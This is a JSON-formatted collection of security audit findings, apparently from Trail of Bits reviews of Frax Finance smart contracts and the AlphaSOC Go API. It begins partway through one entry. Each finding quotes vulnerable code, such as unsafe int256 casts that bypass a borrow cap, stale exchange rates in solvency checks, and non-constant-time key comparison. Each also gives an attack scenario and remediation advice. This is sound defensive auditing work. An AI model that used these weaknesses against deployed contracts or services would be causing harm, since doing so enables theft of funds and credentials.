necessary if (longTermOrders.lastVirtualOrderTimestamp != blockTimestamp) { //amount sold from virtual trades uint256 blockTimestampElapsed = blockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); updateOrderPoolAfterExecution(longTermOrders, orderPool0, orderPool1, token0Out, token1Out, blockTimestamp); } } Figure 3.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L216-L252 However, despite the complexity of this function, it does not emit any events; it will be dicult to monitor issues that may arise whenever the function is executed. Additionally, important operations in the FPIControllerPool and CPITrackerOracle contracts do not emit any events: function toggleMints() external onlyByOwnGov { mints_paused = !mints_paused; } function toggleRedeems() external onlyByOwnGov { redeems_paused = !redeems_paused; } function setFraxBorrowCap(int256 _frax_borrow_cap) external onlyByOwnGov { frax_borrow_cap = _frax_borrow_cap; } function setMintCap(uint256 _fpi_mint_cap) external onlyByOwnGov { fpi_mint_cap = _fpi_mint_cap; } Figure 3.2: FPI/FPIControllerPool.sol#L528-L542 Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions, and it will be dicult to review the correct behavior of the contracts once they have been deployed. Exploit Scenario Eve, a malicious user, discovers a vulnerability that allows her to manipulate long-term swaps. Because no events are generated from her actions, the attack goes unnoticed. Eve uses her exploit to drain liquidity or prevent other users from swapping before the Frax Finance team has a chance to respond. Recommendations Short term, emit events for all operations that may contribute to a higher level of monitoring and alerting, even internal ones. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. A monitoring mechanism for critical events could quickly detect system compromises.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Unsafe integer conversions in FPIControllerPool ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "description": "Explicit integer conversions can be used to bypass certain restrictions (e.g., the borrowing cap) in the FPIControllerPool contract. The FPIControllerPool contract allows certain users to either borrow or repay FRAX within certain limits (e.g., the borrowing cap): // Lend the FRAX collateral to an AMO function giveFRAXToAMO(address destination_amo, uint256 frax_amount) external onlyByOwnGov validAMO(destination_amo) { int256 frax_amount_i256 = int256(frax_amount); // Update the balances first require((frax_borrowed_sum + frax_amount_i256) <= frax_borrow_cap, \"Borrow frax_borrowed_balances[destination_amo] += frax_amount_i256; frax_borrowed_sum += frax_amount_i256; // Give the FRAX to the AMO TransferHelper.safeTransfer(address(FRAX), destination_amo, frax_amount); cap\"); } // AMO gives back FRAX. Needed for proper accounting function receiveFRAXFromAMO(uint256 frax_amount) external validAMO(msg.sender) { int256 frax_amt_i256 = int256(frax_amount); // Give back first TransferHelper.safeTransferFrom(address(FRAX), msg.sender, address(this), frax_amount); // Then update the balances frax_borrowed_balances[msg.sender] -= frax_amt_i256; frax_borrowed_sum -= frax_amt_i256; } Figure 4.1: The giveFRAXToAMO function in FPIControllerPool.sol However, these functions explicitly convert these variables from uint256 to int256; these conversions will never revert and can produce unexpected results. For instance, if frax_amount is set to a very large unsigned integer, it could be cast to a negative number. Malicious users could exploit this fact by adjusting the variables to integers that will bypass the limits imposed by the code after they are cast. The same issue aects the implementation of price_info: // Get additional info about the peg status function price_info() public view returns ( int256 collat_imbalance, uint256 cpi_peg_price, uint256 fpi_price, uint256 price_diff_frac_abs ) { fpi_price = getFPIPriceE18(); cpi_peg_price = cpiTracker.currPegPrice(); uint256 fpi_supply = FPI_TKN.totalSupply(); if (fpi_price > cpi_peg_price){ collat_imbalance = int256(((fpi_price - cpi_peg_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((fpi_price - cpi_peg_price) * PEG_BAND_PRECISION) / fpi_price; } else { collat_imbalance = -1 * int256(((cpi_peg_price - fpi_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((cpi_peg_price - fpi_price) * PEG_BAND_PRECISION) / fpi_price; } } Figure 4.2: The price_info function in FPIControllerPool.sol Exploit Scenario Eve submits a governance proposal that can increase the amount of FRAX that can be borrowed. The voters approve the proposal because they believe that the borrowing cap will stop Eve from changing it to a larger value. Recommendations Short term, add checks to the relevant functions to validate the results of explicit integer conversions to ensure that they are within the expected range. Long term, use extensive smart contract fuzzing to test that system invariants cannot be broken.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. leveragedPosition and repayAssetWithCollateral do not update the exchangeRate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "description": "Some FraxLend functions do not update the exchange rate, allowing insolvent users to call them. The FraxLend platform oers various operations, such as leveragedPosition and repayAssetWithCollateral, for users to borrow funds as long as they are solvent. The solvency check is implemented by the isSolvent modier, which runs at the end of such operations: /// @notice Checks for solvency AFTER executing contract code /// @param _borrower The borrower whose solvency we will check modifier isSolvent(address _borrower) { _; require(_isSolvent(_borrower, exchangeRateInfo.exchangeRate), \"FraxLendPair: user is insolvent\"); } Figure 5.1: The isSolvent modier in the FraxLendCore contract However, this modier is not enough to ensure solvency since the exchange rate changes over time, which can make previously solvent users insolvent. That is why it is important to force an update of the exchange rate during any operation that allows users to borrow funds: function updateExchangeRate() public returns (uint256 _exchangeRate) { ExchangeRateInfo memory _exchangeRateInfo = exchangeRateInfo; if (_exchangeRateInfo.lastTimestamp == block.timestamp) return _exchangeRate = _exchangeRateInfo.exchangeRate;  // write to storage _exchangeRateInfo.exchangeRate = uint224(_exchangeRate); _exchangeRateInfo.lastTimestamp = uint32(block.timestamp); exchangeRateInfo = _exchangeRateInfo; emit UpdateExchangeRate(_exchangeRate); } Figure 5.2: Part of the updateExchangeRate function in the FraxLendCore contract However, the leveragedPosition and repayAssetWithCollateral operations increase the debt of the caller but do not call updateExchangeRate; therefore, they will perform the solvency check with old information. Exploit Scenario Eve, a malicious user, notices a drop in the collateral price. She calls leveragedPosition or repayAssetWithCollateral to borrow more than the amount of shares/collateral she should be able to. Recommendations Short term, add a call to updateExchangeRate in every function that increases users debt. Long term, document the invariants and preconditions for every function and use extensive smart contract fuzzing to test that system invariants cannot be broken.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Risk of hash collisions in FraxLendPairDeployer that could block certain deployments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "description": "A hash collision could occur in the FraxLendPairDeployer contract, allowing unauthenticated users to block the deployment of certain contracts from authenticated users. The FraxLendPairDeployer contract allows any user to deploy certain contracts using the deploy function, which creates a contract name based on certain parameters: function deploy( address _asset, address _collateral, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes calldata _rateInitCallData ) external returns (address _pairAddress) { string memory _name = string( abi.encodePacked( \"FraxLendV1-\", IERC20(_collateral).safeName(), \"/\", IERC20(_asset).safeName(), \" - \", IRateCalculator(_rateContract).name(), \" - \", deployedPairsArray.length + 1 ) );  Figure 6.1: The header of the deploy function in the FraxLendPairDeployer contract The _deploySecond function creates a hash of this contract name and checks it to ensure that it has not already been deployed: function _deploySecond( string memory _name, address _pairAddress, address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, address[] memory _approvedBorrowers, address[] memory _approvedLenders ) private {  bytes32 _nameHash = keccak256(bytes(_name)); require(deployedPairsByName[_nameHash] == address(0), \"FraxLendPairDeployer: Pair name must be unique\"); deployedPairsByName[_nameHash] = _pairAddress;  Figure 6.2: Part of the _deploySecond function in the FraxLendPairDeployer contract Both authenticated and unauthenticated users can use this code to deploy contracts, but only authenticated users can select any name for contracts they want to deploy. Additionally, the _deployFirst function computes a salt based on certain parameters: function _deployFirst( address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, bool _isBorrowerWhitelistActive, bool _isLenderWhitelistActive ) private returns (address _pairAddress) { { //clones are distinguished by their data bytes32 salt = keccak256( abi.encodePacked( _asset, _collateral, _maxLTV, _liquidationFee, _oracleTop, _oracleDiv, _oracleNormalization, _rateContract, _rateInitCallData, _isBorrowerWhitelistActive, _isLenderWhitelistActive ) ); require(deployedPairsBySalt[salt] == address(0), \"FraxLendPairDeployer: Pair already deployed\");  Figure 6.3: The header of the _deployFirst function in the FraxLendPairDeployer contract Again, both authenticated and unauthenticated users can use this code, but some parameters are xed for unauthorized users (e.g., _maxLTV will always be DEFAULT_MAX_LTV and cannot be changed). However, in both cases, a hash collision could block contracts from being deployed. For example, if an unauthenticated user sees an authenticated users pending transaction to deploy a contract, he could deploy his own contract with a name or parameters that result in a hash collision, preventing the authenticated users contract from being deployed. Exploit Scenario Alice, an authenticated user, starts a custom deployment with certain parameters. Eve, a malicious user, sees Alices unconrmed transactions and front-runs them with her own call to deploy a contract with similar parameters. Eves transaction succeeds, causing Alices deployment to fail and forcing her to change either the contracts name or the parameters of the call to deploy. Recommendations Short term, prevent collisions between dierent types of deployments. Long term, review the permissions and capabilities of authenticated and unauthenticated users in every component.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. API keys are leaked outside of the application server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "API key verication is handled by the AuthKey function (gure 1.1). This function uses the auth method, which passes the plaintext value of a key to the database (as part of the database query), as shown in gure 1.2. func (s *CustomerStore) AuthKey(ctx context.Context, key string) (*clap.User, error) { internalUser, err := s.authInternalKey(ctx, key) if err == store.ErrInvalidAPIKey { return s.auth(ctx, \"auth_api_key\", key) } else if err != nil { return nil, err } return internalUser, nil } Figure 1.1: The call to the auth method (clap/internal/dbstore/customer.go#L73L82) func (s *CustomerStore) auth(ctx context.Context, funName string, value interface{}) (*clap.User, error) { user := &clap.User{ Type: clap.UserTypeCustomer, } err := s.db.QueryRowContext(ctx, fmt.Sprintf(` SELECT ws.sid, ws.workspace_id, ws.credential_id FROM console_clap.%s($1) AS ws LEFT JOIN api.disabled_user AS du ON du.user_id = ws.sid WHERE du.user_id IS NULL LIMIT 1 `, pq.QuoteIdentifier(funName)), value).Scan(&user.ID, &user.WorkspaceID, &user.CredentialID) ... } Figure 1.2: The database query, with an embedded plaintext key (clap/internal/dbstore/customer.go#L117L141) Moreover, keys are generated in the database (gure 1.3) rather than in the Go code and are then sent back to the API, which increases their exposure. gk := &store.GeneratedKey{} err = tx.QueryRowContext(ctx, ` SELECT sid, key FROM console_clap.key_request() `).Scan(&gk.CustomerID, &gk.Key) Figure 1.3: clap/internal/dbstore/customer.go#L50L53 Exploit Scenario An attacker gains access to connection trac between the application server and the database, steals the API keys being transmitted, and uses them to impersonate their owners. Recommendations Short term, have the API hash keys before sending them to the database, and generate API keys in the Go code. This will reduce the keys exposure. Long term, document the trust boundaries traversed by sensitive data.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Unused insecure authentication mechanism ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "The clap code contains an unused insecure authentication mechanism, the FixedKeyAuther strategy, that stores congured plaintext keys (gure 2.1) and veries them through a non-constant-time comparison (gure 2.2). The use of this comparison creates a timing attack risk. /* if cfg.Server.SickMode { if cfg.Server.ApiKey == \"\" { config\") log15.Crit(\"In sick mode, api key variable must be set in os.Exit(1) } auther = FixedKeyAuther{ ID: -1, Key: cfg.Server.ApiKey, } } else*/ Figure 2.1: clap/server/server.go#L57L67 type FixedKeyAuther struct { Key string ID int64 } func (a FixedKeyAuther) AuthKey(ctx context.Context, key string) (*clap.User, error) { if key != \"\" && key == a.Key { return &clap.User{ID: a.ID}, nil } return nil, nil } Figure 2.2: clap/server/auth.go#L19L29 Exploit Scenario The FixedKeyAuther strategy is enabled. This increases the risk of a key leak, since the authentication mechanism is vulnerable to timing attacks and stores plaintext API keys in memory. Recommendations Short term, to prevent API key exposure, either remove the FixedKeyAuther strategy or change it so that it uses a hash of the API key. Long term, avoid leaving commented-out or unused code in the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Use of panics to handle user-triggerable errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "The clap HTTP handler mechanism uses panic to handle errors that can be triggered by users (gures 3.1 and 3.2). Handling these unusual cases of panics requires the mechanism to lter out errors of the RequestError type (gure 3.3). The use of panics to handle expected errors alters the panic semantics, deviates from callers expectations, and makes reasoning about the code and its error handling more dicult. func (r *Request) MustUnmarshal(v interface{}) { ... err := json.NewDecoder(body).Decode(v) if err != nil { panic(BadRequest(\"Failed to parse request body\", \"jsonErr\", err)) } } Figure 3.1: clap/lib/clap/request.go#L31L42 // MustBeAuthenticated returns user ID if request authenticated, // otherwise panics. func (r *Request) MustBeAuthenticated() User { user, err := r.User() if err == nil && user == nil { err = errors.New(\"user is nil\") } else if !user.Valid() { err = errors.New(\"user id is zero\") } if err != nil { panic(Error(\"not authenticated: \" + err.Error())) } return *user } Figure 3.2: clap/lib/clap/request.go#L134L147 defer func() { if e := recover(); e != nil { if err, ok := e.(*RequestError); ok { onError(w, r, err) } else { panic(e) } } }() Figure 3.3: clap/lib/clap/handler.go#L93L101 Recommendations Short term, change the code in gures 3.1, 3.2, and 3.3 so that it adheres to the conventions of handling expected errors in Go. This will simplify the error-handling functionality and the process of reasoning about the code. Reserving panics for unexpected situations or bugs in the code will also help surface incorrect assumptions. Long term, use panics only to handle unexpected errors.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Confusing API authentication mechanism ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "The clap HTTP endpoint handler code appears to indicate that the handlers perform manual endpoint authentication. This is because when a handler receives a clap.Request, it calls the MustBeAuthenticated method (gure 4.1). The name of this method could imply that it is called to authenticate the endpoint. However, MustBeAuthenticated returns information on the (already authenticated) user who submitted the request; authentication is actually performed by default by a centralized mechanism before the call to a handler. Thus, the use of this method could cause confusion regarding the timing of authentication. func (h *AlertsHandler) handleGet(r *clap.Request) interface{} { // Parse arguments q := r.URL.Query() var minSeverity uint64 if ms := q.Get(\"minSeverity\"); ms != \"\" { var err error minSeverity, err = strconv.ParseUint(ms, 10, 8) if err != nil || minSeverity > 5 { return clap.BadRequest(\"Invalid minSeverity parameter\") } } if h.MinSeverity > minSeverity { minSeverity = h.MinSeverity } filterEventType := q.Get(\"eventType\") user := r.MustBeAuthenticated() ... } Figure 4.1: clap/apiv1/alerts.go#L363L379 Recommendations Short term, add a ServeAuthenticatedAPI interface method that takes an additional user parameter indicating that the handler is already in the authenticated context. Long term, document the authentication system to make it easier for new team members and auditors to understand and to facilitate their onboarding.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Use of MD5 can lead to lename collisions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "When generating a lename, the deriveQueueFile function uses an unsafe MD5 hash function to hash the destinationID that is included in the lename (gure 5.1). func deriveQueueFile(outputType, destinationID string) string { return fmt.Sprintf(\"%s-%x.bdb\", outputType, md5.Sum([]byte(destinationID))) } Figure 5.1: ae/config/config.go#L284L286 Exploit Scenario An attacker with control of a destinationID value modies the value, with the goal of causing a hash collision. The hash computed by md5.Sum collides with that of an existing lename. As a result, the existing le is overwritten. Recommendations Short term, replace the MD5 function with a safer alternative such as SHA-2. Long term, avoid using the MD5 function unless it is necessary for interfacing with a legacy system in a non-security-related context.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Overly broad le permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "In several parts of the ae code, les are created with overly broad permissions that allow them to be read by anyone in the system. This occurs in the following code paths:  ae/tools/copy.go#L50  ae/bqimport/import.go#L291  ae/tools/migrate.go#L127  ae/tools/migrate.go#L223  ae/tools/migrate.go#L197  ae/tools/copy.go#L16  ae/main.go#L319 Recommendations Short term, change the le permissions, limiting them to only those that are necessary. Long term, always consider the principle of least privilege when making decisions about le permissions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Unhandled errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "description": "The gosec tool identied many unhandled errors in the ae and clap codebases. Recommendations Short term, run gosec on the ae and clap codebases, and address the unhandled errors. Even if an error is considered unimportant, it should still be handled and discarded, and the decision to discard it should be justied in a code comment. Long term, encourage the team to use gosec, and run it before any major release.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    }
]